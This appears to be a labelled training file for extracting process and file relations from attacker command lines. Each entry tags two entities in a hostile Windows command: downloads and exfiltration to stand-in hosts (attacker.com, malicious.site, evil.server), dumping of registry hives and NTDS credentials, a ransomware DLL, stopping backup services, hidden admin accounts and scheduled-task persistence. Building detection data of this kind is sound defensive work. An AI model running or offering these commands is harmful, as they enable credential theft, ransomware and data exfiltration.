+process-file-write(e1,e2)	"<e1>adfind.exe</e1> -f ""(objectcategory=computer)"" > <e2>ad_computers.txt</e2>"
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
+process-file-read(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save <e2>hklm\security</e2> c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt
+process-process-unlink(e1,e2)	<e1>svchost.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
+process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /F /sc minute /mo 1 /tn <e2>""BrowserUpdate""</e2> /tr ""$dst"""
+process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd</e2> > C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp 2> C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp
+process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=in name=""DCOM"" <e2>program=C:\Windows\system32\svchost.exe</e2> service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\VlPWyecW.tmp 2>&1"
+process-file-exec(e1,e2)	C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && <e1>powershell</e1> -Command start <e2>script.bat</e2> -Verb RunAs
+process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""Zoolz 2 Service""</e2> /y"
+process-file-read(e1,e2)	<e1>certutil_95.exe</e1> -urlcache -split -f http://malicious.site/data_95.enc <e2>C:\Temp\temp_95.enc</e2>
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist""</e2> /v Adminv\$ /t REG\_DWORD /d 0"
+process-process-fork(e1,e2)	<e1>cmd_18.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_18.bat
+process-file-chmod(e1,e2)	rundll32.exe <e1>attrib</e1> +s +h <e2>C:\ProgramData\updater.exe</e2>
+process-process-fork(e1,e2)	"<e1>powershell.exe</e1> <e2>""ntdsutil.exe</e2> 'ac i ntds' 'ifm' 'create full c:\users\public\ntds' q q"""
+process-socket-send(e1,e2)	<e1>svchost.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
+process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll ,run <e2>/TARGET=\\HOST1.DOMAIN.NAME\C$</e2>
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>icacls</e2> /var/tmp/hide.so /grant Everyone:F
+process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> -n 1 <e2><REDACTED_DOMAIN_NAME></e2>
+process-file-write(e1,e2)	<e1>rundll32_38.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
+process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>VeeamDeploySvc</e2> /y
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>del</e2> /usr/local/bin/backdoor
+process-file-read(e1,e2)	"<e1>python_8.exe</e1> -c <e2>""open('C:\\temp\\pw_8.txt').read()""</e2>"
+process-file-read(e1,e2)	<e1>7z_43.exe</e1> x <e2>C:\Users\Public\archive_43.7z</e2> -so > nul
+process-file-write(e1,e2)	<e1>rundll32_78.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core""</e2> /t REG_DWORD /v ""EnableConcurrentSessions"" /d 1 /f"
